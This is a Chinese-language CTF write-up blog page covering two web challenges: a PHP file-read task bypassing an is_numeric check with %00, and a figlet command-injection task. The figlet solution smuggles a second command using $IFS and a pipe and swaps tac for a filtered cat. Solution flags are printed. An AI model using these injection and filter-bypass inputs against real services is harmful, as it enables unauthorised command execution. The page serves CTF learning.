+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">base64</span><br><span class="line">--</span><br><span class="line">PD9waHANCiBlcnJvcl9yZXBvcnRpbmcoMCk7DQogJGZsYWcgPSAkX0VOVlsnRkxBRyddOw0KDQogJGx1Y2t5ID0gJF9HRVRbJ2x1Y2t5bnVtYmVyJ107DQoNCiBpZihpc3NldCgkbHVja3kpKXsNCiAgICAgaWYoaXNfbnVtZXJpYygkbHVja3kpKXsNCiAgICAgICAgIGRpZSgiTm90IGEgbnVtYmVyIik7DQogICAgIH1lbHNlaWYoJGx1Y2t5ID09IDc3Nyl7DQogICAgICAgIGVjaG8gIkNvbmdyYWR1bGF0aW9ucywgdGhlIGZsYWcgaXMgOiIuJGZsYWc7DQogICAgfQ0KIH1lbHNlew0KICAgIHJldHVybjsNCiB9</span><br><span class="line">--</span><br><span class="line">findme.php</span><br><span class="line">--</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> error_reporting(<span class="number">0</span>);</span><br><span class="line"> <span class="variable">$flag</span> = <span class="variable">$_ENV</span>[<span class="string">&#x27;FLAG&#x27;</span>];</span><br><span class="line"></span><br><span class="line"> <span class="variable">$lucky</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;luckynumber&#x27;</span>];</span><br><span class="line"></span><br><span class="line"> <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$lucky</span>))&#123;</span><br><span class="line">     <span class="keyword">if</span>(is_numeric(<span class="variable">$lucky</span>))&#123;</span><br><span class="line">         <span class="keyword">die</span>(<span class="string">&quot;Not a number&quot;</span>);</span><br><span class="line">     &#125;<span class="keyword">elseif</span>(<span class="variable">$lucky</span> == <span class="number">777</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Congradulations, the flag is :&quot;</span>.<span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
+<ol start="9">
+<li>发现新的 get 参数，并且存在判断<br>
+<img src="read_3.png" alt="read 3"></li>
+<li>当值为数字时，会报 not a number，但仍需要 num == 777，结尾加上 <code>%00</code>，会被认定为 字符串<br>
+<img src="read_4.png" alt="read 4"></li>
+<li>flag</li>
+</ol>
+<blockquote>
+<p>VIDAR{ReAD<em>My_F1lE_inA</em>Flexibleway__and_ExPl0it!MySEcret}</p>
+</blockquote>
+<h3 id="感谢学长帮助">感谢学长帮助</h3>
+<h2 id="Fatal-Command">Fatal Command</h2>
+<h3 id="题目描述-16">题目描述</h3>
+<p>ek1ng, who just installed linux, found an interesting package called figlet, so he wrote an online font conversion site with figlet, but he seems to use a deadly function.</p>
+<h3 id="题解-16">题解</h3>
+<ol>
+<li>访问，得知了一个命令行工具 figlet ，考察命令注入<br>
+<img src="command_1.png" alt="command 1"></li>
+<li>提示 give up ，可能是存在过滤，猜测空格过滤，经过尝试 <code>$IFS</code> 可以绕过过滤<br>
+<img src="command_2.png" alt="command 2"></li>
+</ol>
+<blockquote>
+<p>test$IFS|ls$IFS…<br>
+<img src="command_3.png" alt="command 3"></p>
+</blockquote>
+<ol start="3">
+<li>发现 flag 字样，cat 读取<br>
+<img src="command_4.png" alt="command 4"></li>
+<li>可能过滤 cat，改用 tac<br>
+<img src="command_5.png" alt="command 5"></li>
+<li>得到 flag</li>
+</ol>
+<blockquote>
+<p>VIDAR{C0mmand_1njection_1s^sO0O_inter3st1n5~!}</p>
+</blockquote>
+<h3 id="离谱的做法">离谱的做法</h3>
+<blockquote>
+<p>我也不知道我怎么想得<br>
+将命令执行的结果作为 figlet 参数输出出来，得到奇怪的结果<br>
+<img src="command_6.png" alt="command 6"><br>
+<img src="command_7.png" alt="command 7"><br>
+然后我就认不出来了。。。<br>
+感谢学长拉我回来</p>
+</blockquote>
+
+
+        <hr>
+        <!-- Pager -->
+        <ul class="pager">
+          
+          <li class="previous">
+            <a href="/cn/CBC-BUU/" data-toggle="tooltip" data-placement="top" title="CBC-DAS">&larr; Previous Post</a>
+          </li>
+          
+          
+          <li class="next">
+            <a href="/cn/MyFirstBlog/" data-toggle="tooltip" data-placement="top" title="MyFirstBlog">Next Post &rarr;</a>
+          </li>
+          
+        </ul>
+
+        
+        <!-- tip start -->
+        <!-- tip -->
+<!-- tip start -->
+<div class="tip">
+  <p>
+    
+      如果您喜欢此博客或发现它对您有用，则欢迎对此发表评论。 也欢迎您共享此博客，以便更多人可以参与。 如果博客中使用的图像侵犯了您的版权，请与作者联系以将其删除。 谢谢 ！
+    
+  </p>
+</div>
+<!-- tip end -->
+
+        <!-- tip end -->
+        
+
+        
+        <!-- Sharing Srtart -->
+        <!-- Social Social Share Post -->
+<!-- Docs:https://github.com/overtrue/share.js -->
+
+<div class="social-share" data-initialized="true" data-disabled="tencent ,douban ,qzone ,linkedin ,facebook ,google ,diandian" data-wechat-qrcode-helper="" align="center">
+  <ul class="list-inline text-center social-share-ul">
+    <li class="social-share-li">
+      <a target="_blank" class="social-share-icon icon-twitter">
+        <i class="fa fa-twitter fa-1x" aria-hidden="true"></i>
+      </a>
+    </li>
+    <li class="social-share-li">
+      <a class="social-share-icon icon-wechat">
+        <i class="fa fa-weixin fa-1x" aria-hidden="true"></i>
+      </a>
+    </li>
+    <li class="social-share-li">
+      <a target="_blank" class="social-share-icon icon-weibo">
+        <i class="fa fa-weibo fa-1x" aria-hidden="true"></i>
+      </a>
+    </li>
+    <li class="social-share-li">
+      <a target="_blank" class="social-share-icon icon-qq">
+        <i class="fa fa-qq fa-1x" aria-hidden="true"></i>
+      </a>
+    </li>
+    <li class="social-share-li">
+      <a target="_blank" class="social-share-icon" href="mailto:?subject=HGAME MINI&body=Hi,I found this website and thought you might like it https://jbnrz.github.io/cn/Vidar/">
+        <i class="fa fa-envelope fa-1x" aria-hidden="true"></i>
+      </a>
+    </li>
+  </ul>
+</div>
+
+<!-- css & js -->
+<!-- <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/social-share.js/1.0.16/css/share.min.css"> -->
+<script defer="defer" async="true" src="https://cdnjs.cloudflare.com/ajax/libs/social-share.js/1.0.16/js/social-share.min.js"></script>
+
+        <!-- Sharing End -->
+        
+        <hr>
+
+        <!-- comments start -->
+        <!-- 1. gitalk comment -->
+
+
+<!-- 2. gitment comment -->
+
+
+<!-- 3. disqus comment -->
+
+
+        <!-- comments end -->
+        <hr>
+
+      </div>
+
+      <!-- Catalog: Tabe of Content -->
+      <!-- Table of Contents -->
+
+    
+      <aside id="sidebar">
+        <div id="toc" class="toc-article">
+        <strong class="toc-title">目录</strong>
+        
+          <ol class="toc-nav"><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link"><span class="toc-nav-number">1.</span> <span class="toc-nav-text">Misc</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#Ekrulila%E2%80%99s-picture"><span class="toc-nav-number">1.1.</span> <span class="toc-nav-text">Ekrulila’s picture</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#%E9%A2%98%E8%A7%A3"><span class="toc-nav-number">1.1.1.</span> <span class="toc-nav-text">题解</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#Weird-suffix"><span class="toc-nav-number">1.2.</span> <span class="toc-nav-text">Weird suffix</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#%E9%A2%98%E7%9B%AE%E6%8F%8F%E8%BF%B0"><span class="toc-nav-number">1.2.1.</span> <span class="toc-nav-text">题目描述</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#%E9%A2%98%E8%A7%A3-2"><span class="toc-nav-number">1.2.2.</span> <span class="toc-nav-text">题解</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#Hidden-Zip"><span class="toc-nav-number">1.3.</span> <span class="toc-nav-text">Hidden Zip</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#%E9%A2%98%E7%9B%AE%E6%8F%8F%E8%BF%B0-2"><span class="toc-nav-number">1.3.1.</span> <span class="toc-nav-text">题目描述</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#Hints"><span class="toc-nav-number">1.3.2.</span> <span class="toc-nav-text">Hints</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#%E9%A2%98%E8%A7%A3-3"><span class="toc-nav-number">1.3.3.</span> <span class="toc-nav-text">题解</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#Twisted-figures"><span class="toc-nav-number">1.4.</span> <span class="toc-nav-text">Twisted figures</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#%E9%A2%98%E7%9B%AE%E6%8F%8F%E8%BF%B0-3"><span class="toc-nav-number">1.4.1.</span> <span class="toc-nav-text">题目描述</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#Hints-2"><span class="toc-nav-number">1.4.2.</span> <span class="toc-nav-text">Hints</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#%E9%A2%98%E8%A7%A3-4"><span class="toc-nav-number">1.4.3.</span> <span class="toc-nav-text">题解</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#Hard-zip"><span class="toc-nav-number">1.5.</span> <span class="toc-nav-text">Hard zip</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#%E9%A2%98%E7%9B%AE%E6%8F%8F%E8%BF%B0-4"><span class="toc-nav-number">1.5.1.</span> <span class="toc-nav-text">题目描述</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#%E9%A2%98%E8%A7%A3-5"><span class="toc-nav-number">1.5.2.</span> <span class="toc-nav-text">题解</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#Adventure-of-the-Dancing-Men"><span class="toc-nav-number">1.6.</span> <span class="toc-nav-text">Adventure of the Dancing Men</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#%E9%A2%98%E7%9B%AE%E6%8F%8F%E8%BF%B0-5"><span class="toc-nav-number">1.6.1.</span> <span class="toc-nav-text">题目描述</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#Hints-3"><span class="toc-nav-number">1.6.2.</span> <span class="toc-nav-text">Hints:</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#%E9%A2%98%E8%A7%A3-6"><span class="toc-nav-number">1.6.3.</span> <span class="toc-nav-text">题解</span></a></li></ol></li></ol></li><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link"><span class="toc-nav-number">2.</span> <span class="toc-nav-text">Web</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#Do-you-really-understand-HTTP"><span class="toc-nav-number">2.1.</span> <span class="toc-nav-text">Do you really understand HTTP</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#%E9%A2%98%E7%9B%AE%E6%8F%8F%E8%BF%B0-6"><span class="toc-nav-number">2.1.1.</span> <span class="toc-nav-text">题目描述</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#Hints-4"><span class="toc-nav-number">2.1.2.</span> <span class="toc-nav-text">Hints:</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#%E9%A2%98%E8%A7%A3-7"><span class="toc-nav-number">2.1.3.</span> <span class="toc-nav-text">题解</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#The-Knife"><span class="toc-nav-number">2.2.</span> <span class="toc-nav-text">The Knife</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#%E9%A2%98%E7%9B%AE%E6%8F%8F%E8%BF%B0-7"><span class="toc-nav-number">2.2.1.</span> <span class="toc-nav-text">题目描述</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#%E9%A2%98%E8%A7%A3-8"><span class="toc-nav-number">2.2.2.</span> <span class="toc-nav-text">题解</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#watch-carefully"><span class="toc-nav-number">2.3.</span> <span class="toc-nav-text">watch carefully</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#%E9%A2%98%E7%9B%AE%E6%8F%8F%E8%BF%B0-8"><span class="toc-nav-number">2.3.1.</span> <span class="toc-nav-text">题目描述</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#Get-Post-Universe"><span class="toc-nav-number">2.4.</span> <span class="toc-nav-text">Get Post Universe</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#%E9%A2%98%E7%9B%AE%E6%8F%8F%E8%BF%B0-9"><span class="toc-nav-number">2.4.1.</span> <span class="toc-nav-text">题目描述</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#%E9%A2%98%E8%A7%A3-9"><span class="toc-nav-number">2.4.2.</span> <span class="toc-nav-text">题解</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#Book-Management-System"><span class="toc-nav-number">2.5.</span> <span class="toc-nav-text">Book Management System</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#%E9%A2%98%E7%9B%AE%E6%8F%8F%E8%BF%B0-10"><span class="toc-nav-number">2.5.1.</span> <span class="toc-nav-text">题目描述</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#%E9%A2%98%E8%A7%A3-10"><span class="toc-nav-number">2.5.2.</span> <span class="toc-nav-text">题解</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#%E5%A4%87%E6%B3%A8%EF%BC%9A%E6%B3%A8%E5%85%A5"><span class="toc-nav-number">2.5.3.</span> <span class="toc-nav-text">备注：注入</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#Book-Management-System-V2"><span class="toc-nav-number">2.6.</span> <span class="toc-nav-text">Book Management System V2</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#%E9%A2%98%E7%9B%AE%E6%8F%8F%E8%BF%B0-11"><span class="toc-nav-number">2.6.1.</span> <span class="toc-nav-text">题目描述</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#%E9%A2%98%E8%A7%A3-11"><span class="toc-nav-number">2.6.2.</span> <span class="toc-nav-text">题解</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#Concat-To-Intranet"><span class="toc-nav-number">2.7.</span> <span class="toc-nav-text">Concat To Intranet</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#%E9%A2%98%E7%9B%AE%E6%8F%8F%E8%BF%B0-12"><span class="toc-nav-number">2.7.1.</span> <span class="toc-nav-text">题目描述</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#%E9%A2%98%E8%A7%A3-12"><span class="toc-nav-number">2.7.2.</span> <span class="toc-nav-text">题解</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#Security-Center"><span class="toc-nav-number">2.8.</span> <span class="toc-nav-text">Security Center</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#%E9%A2%98%E7%9B%AE%E6%8F%8F%E8%BF%B0-13"><span class="toc-nav-number">2.8.1.</span> <span class="toc-nav-text">题目描述</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#%E9%A2%98%E8%A7%A3-13"><span class="toc-nav-number">2.8.2.</span> <span class="toc-nav-text">题解</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#My-Notebook"><span class="toc-nav-number">2.9.</span> <span class="toc-nav-text">My Notebook</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#%E9%A2%98%E7%9B%AE%E6%8F%8F%E8%BF%B0-14"><span class="toc-nav-number">2.9.1.</span> <span class="toc-nav-text">题目描述</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#%E9%A2%98%E8%A7%A3-14"><span class="toc-nav-number">2.9.2.</span> <span class="toc-nav-text">题解</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#Read-something-useful"><span class="toc-nav-number">2.10.</span> <span class="toc-nav-text">Read something useful</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#%E9%A2%98%E7%9B%AE%E6%8F%8F%E8%BF%B0-15"><span class="toc-nav-number">2.10.1.</span> <span class="toc-nav-text">题目描述</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#%E9%A2%98%E8%A7%A3-15"><span class="toc-nav-number">2.10.2.</span> <span class="toc-nav-text">题解</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#%E6%84%9F%E8%B0%A2%E5%AD%A6%E9%95%BF%E5%B8%AE%E5%8A%A9"><span class="toc-nav-number">2.10.3.</span> <span class="toc-nav-text">感谢学长帮助</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#Fatal-Command"><span class="toc-nav-number">2.11.</span> <span class="toc-nav-text">Fatal Command</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#%E9%A2%98%E7%9B%AE%E6%8F%8F%E8%BF%B0-16"><span class="toc-nav-number">2.11.1.</span> <span class="toc-nav-text">题目描述</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#%E9%A2%98%E8%A7%A3-16"><span class="toc-nav-number">2.11.2.</span> <span class="toc-nav-text">题解</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#%E7%A6%BB%E8%B0%B1%E7%9A%84%E5%81%9A%E6%B3%95"><span class="toc-nav-number">2.11.3.</span> <span class="toc-nav-text">离谱的做法</span></a></li></ol></li></ol></li></ol>
+        
+        </div>
+      </aside>
+    
+
+
+
+      <!-- Sidebar Container -->
+      <div class="
+                col-lg-8 col-lg-offset-1
+                col-md-10 col-md-offset-1
+                sidebar-container">
+
+        <!-- Featured Tags -->
+        
+        <section>
+          <!-- no hr -->
+          <h5>
+            <a href="/tags/">特色标签</a>
+          </h5>
+          <div class="tags">
+            
+            <a class="tag" href="/tags/#Vidar" title="Vidar">Vidar</a>
+            
+            <a class="tag" href="/tags/#easy" title="easy">easy</a>
+            
+          </div>
+        </section>
+        
+
+        <!-- Friends Blog -->
+        
+        <hr>
+        <h5>链友</h5>
+        <ul class="list-inline">
+
+          
+          <li>
+            <a href="https://pankas.top/" target="_blank">pankas</a>
+          </li>
+          
+          <li>
+            <a href="https://Anylike.top/" target="_blank">Anylike</a>
+          </li>
+          
+          <li>
+            <a href="http://www.fzwjscj.xyz/" target="_blank">FzWjScJ</a>
+          </li>
+          
+          <li>
+            <a href="https://jayxv.github.io/" target="_blank">Van1sh</a>
+          </li>
+          
+          <li>
+            <a href="http://www.whiskeyjj.com/" target="_blank">Whiskeyjj</a>
+          </li>
+          
+          <li>
+            <a href="http://blog.wendell.pro/" target="_blank">Wendell</a>
+          </li>
+          
+          <li>
+            <a href="http://www.yang99.top/" target="_blank">羊宝</a>
+          </li>
+          
+          <li>
+            <a href="http://www.7yue.top/" target="_blank">七月</a>
+          </li>
+          
+          <li>
+            <a href="https://x1ng.top/" target="_blank">X1ng</a>
+          </li>
+          
+          <li>
+            <a href="https://blog.carrot2.cn/" target="_blank">Carrot2</a>
+          </li>
+          
+          <li>
+            <a href="https://www.cherryc4t.com/" target="_blank">cherryc4t</a>
+          </li>
+          
+          <li>
+            <a href="https://gh0st.top/" target="_blank">Gh0st</a>
+          </li>
+          
+          <li>
+            <a href="http://lazyd0g.top/" target="_blank">lazydog</a>
+          </li>
+          
+          <li>
+            <a href="http://yemei.xyz/" target="_blank">夜魅男孩</a>
+          </li>
+          
+          <li>
+            <a href="https://www.waysoahc.xyz/" target="_blank">小bug</a>
+          </li>
+          
+          <li>
+            <a href="https://nameless.top/" target="_blank">Nameless</a>
+          </li>
+          
+          <li>
+            <a href="https://1manity.top/" target="_blank">1manity</a>
+          </li>
+          
+          <li>
+            <a href="http://yolbby.xyz" target="_blank">yolbby</a>
+          </li>
+          
+          <li>
+            <a href="http://ljl123.club/" target="_blank">Arter</a>
+          </li>
+          
+          <li>
+            <a href="http://www.snowywar.top/" target="_blank">魔法少女雪殇</a>
+          </li>
+          
+          <li>
+            <a href="https://l0tus.vip/" target="_blank">l0tus</a>
+          </li>
+          
+        </ul>
+        
+      </div>
+    </div>
+  </div>
+</article>
+
+
+
+<!-- anchorjs start -->
+<!-- async load function -->
+<!-- anchor-js, Doc:http://bryanbraun.github.io/anchorjs/ -->
+<script type="text/javascript">
+  // async load function
+  function async (u, c) {
+    var d = document,
+      t = 'script',
+      o = d.createElement(t),
+      s = d.getElementsByTagName(t)[0];
+    o.src = u;
+    if (c) {
+      o.addEventListener('load', function(e) {
+        c(null, e);
+      }, false);
+    }
+    s.parentNode.insertBefore(o, s);
+  };
+</script>
+<script type="text/javascript">
+  //anchor-js, Doc:http://bryanbraun.github.io/anchorjs/
+  async ("https://cdn.bootcss.com/anchor-js/1.1.1/anchor.min.js", function() {
+    anchors.options = {
+      visible: 'hover',
+      placement: 'left',
+      // icon: 'ℬ'
+      icon: '❡'
+    };
+    anchors.add().remove('.intro-header h1').remove('.subheading').remove('.sidebar-container h5');
+  });
+</script>
+<style>
+  /* place left on bigger screen */
+  @media all and (min-width: 800px) {
+    .anchorjs-link {
+      position: absolute;
+      left: -0.75em;
+      font-size: 1.1em;
+      margin-top: -0.1em;
+    }
+  }
+</style>
+
+<!-- anchorjs end -->
+
+
+
+		<!-- Footer (contains ThemeColor、viewer) -->
+		<!-- Footer -->
+<footer>
+  <div class="container">
+    <div class="row">
+      <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+        <ul class="list-inline text-center">
+          
+
+          
+            <li>
+              <a target="_blank" href="https://github.com/JBNRZ">
+                <span class="fa-stack fa-lg">
+                  <i class="fa fa-circle fa-stack-2x"></i>
+                  <i class="fa fa-github fa-stack-1x fa-inverse"></i>
+                </span>
+              </a>
+            </li>
+          
+
+          
+
+          
+
+          
+
+          
+
+          
+
+          
+
+        </ul>
+        <p class="copyright text-muted">
+          Copyright &copy;
+          JBNRZ
+          2022
+          <br>
+          Theme by
+          <a target="_blank" rel="noopener" href="http://beantech.org">BeanTech</a>
+          <span style="display: inline-block; margin: 0 5px;">
+            <i class="fa fa-heart"></i>
+          </span>
+          re-Ported by
+          <a target="_blank" rel="noopener" href="https://v-vincen.life/">Live My Life</a>
+          |
+          <iframe style="margin-left: 2px; margin-bottom:-5px;" frameborder="0" scrolling="0" width="91px" height="20px" src="https://ghbtns.com/github-btn.html?user=V-Vincen&repo=V-Vincen.github.io&type=star&count=true"></iframe>
+        </p>
+      </div>
+    </div>
+  </div>
+</footer>
+
+<a id="rocket" href="#top" class=""></a>
+
+
+  <!-- jQuery -->
+  <script type="text/javascript" src="/js/jquery.min.js"></script>
+  <!-- Bootstrap Core JavaScript -->
+  <script type="text/javascript" src="/js/bootstrap.min.js"></script>
+  <!-- Custom Theme JavaScript -->
+  <script type="text/javascript" src="/js/hux-blog.min.js"></script>
+  <!-- catalog -->
+  <script async="true" type="text/javascript" src="/js/catalog.js"></script>
+  <!-- totop(rocket) -->
+  <script async="true" type="text/javascript" src="/js/totop.js"></script>
+
+  
+    <!-- Busuanzi JavaScript -->
+    <script async="async" src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+  
+
+  
+    <!-- Scroll start -->
+    <script async="async" type="text/javascript" src="/js/scroll.js"></script>
+    <!-- Scroll end -->
+  
+
+  
+
+  
+    <!-- Mouseclick -->
+    <script type="text/javascript" src="/js/mouseclick.js" content='C,T,F,J,B,N,R,Z' color='#9933CC,#339933,#66CCCC,#FF99CC,#CCCCFF,#6666CC,#663399,#66CC99,#FF0033'></script>
+  
+
+  
+    <!-- ribbon -->
+    <script type="text/javascript" src="/js/ribbonDynamic.js"></script>
+  
+
+  
+
+
+
+
+
+
+  <!-- viewer start -->
+  <!-- viewer start (Picture preview) -->
+  
+    <script async="async" type="text/javascript" src="/js/viewer/viewer.min.js"></script>
+    <script async="async" type="text/javascript" src="/js/viewer/pic-viewer.js"></script>
+  
+
+  <!-- viewer end -->
+
+
+<script>
+  // async load function
+  function async (u, c) {
+    var d = document,
+      t = 'script',
+      o = d.createElement(t),
+      s = d.getElementsByTagName(t)[0];
+    o.src = u;
+    if (c) {
+      o.addEventListener('load', function (e) {
+        c(null, e);
+      }, false);
+    }
+    s.parentNode.insertBefore(o, s);
+  }
+
+  // fastClick.js
+  async ("https://cdn.bootcss.com/fastclick/1.0.6/fastclick.min.js", function () {
+    var $nav = document.querySelector("nav");
+    if ($nav)
+      FastClick.attach($nav);
+    }
+  )
+</script>
+
+<!-- Because of the native support for backtick-style fenced code blocks right within the Markdown is landed in Github Pages, From V1.6, There is no need for Highlight.js, so Huxblog drops it officially. -
+https://github.com/blog/2100-github-pages-now-faster-and-simpler-with-jekyll-3-0 - https://help.github.com/articles/creating-and-highlighting-code-blocks/ -->
+<!-- <script> async ("http://cdn.bootcss.com/highlight.js/8.6/highlight.min.js", function () { hljs.initHighlightingOnLoad(); }) </script> <link href="http://cdn.bootcss.com/highlight.js/8.6/styles/github.min.css" rel="stylesheet"> -->
+
+<!-- jquery.tagcloud.js -->
+<!-- <script> // only load tagcloud.js in tag.html if ($('#tag_cloud').length !== 0) { async ("https://jbnrz.github.io/js/jquery.tagcloud.js", function () { $.fn.tagcloud.defaults = { // size: { start: 1, end: 1, unit: 'em' }, color: {
+start: '#bbbbee', end: '#0085a1' } }; $('#tag_cloud a').tagcloud(); }) } </script> -->
+
+
+		<!-- Search -->
+		
+		<div class="popup search-popup local-search-popup">
+  <span class="popup-btn-close">
+    ESC
+  </span>
+  <div class="container">
+    <div class="row">
+      <!-- <div class="col-md-9 col-md-offset-1"> -->
+      <div class="col-lg-9 col-lg-offset-1 col-md-10 col-md-offset-1 local-search-content">
+
+        <div class="local-search-header clearfix">
+
+          <div class="local-search-input-wrapper">
+            <span class="search-icon">
+              <i class="fa fa-search fa-lg" style="margin: 25px 10px 25px 20px;"></i>
+            </span>
+            <input autocomplete="off" placeholder="搜索..." type="text" id="local-search-input">
+          </div>
+        </div>
+        <div id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+
+  
+    <script src="/js/ziploader.js"></script>
+  
+  <script>
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.json";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    // monitor main search box;
+    var onPopupClose = function (e) {
+      $('.popup').fadeOut(300);
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $('.popup').fadeIn(300);
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+    // get search zip version
+    $.get('/searchVersion.json?t=' + (+new Date()), function (res) {
+      if (localStorage.getItem('searchVersion') !== res) {
+        localStorage.setItem('searchVersion', res);
+        initSearchJson();
+      }
+    });
+
+    function initSearchJson() {
+      initLoad(['/search.flv'], {
+        loadOptions: {
+          success: function (obj) {
+            localStorage.setItem('searchJson', obj['search.json'])
+          },
+          error: function (e) {
+            return console.log(e)
+          }
+        },
+        returnOptions: {
+          'json': TYPE_TEXT
+        },
+        mimeOptions: {
+          'json': 'application/json'
+        }
+      })
+    }
+    // search function;
+    var searchFunc = function (search_id, content_id) {
+      'use strict';
+      isfetched = true;
+      var datas = JSON.parse(localStorage.getItem('searchJson'));
+      // console.log(search_id)
+      var input = document.getElementById(search_id);
+      var resultContent = document.getElementById(content_id);
+      var inputEventFunction = function () {
+        var searchText = input.value.trim().toLowerCase();
+        var keywords = searchText.split(/[\s\-]+/);
+        if (keywords.length > 1) {
+          keywords.push(searchText);
+        }
+        var resultItems = [];
+        if (searchText.length > 0) {
+          // perform local searching
+          datas.forEach(function (data) {
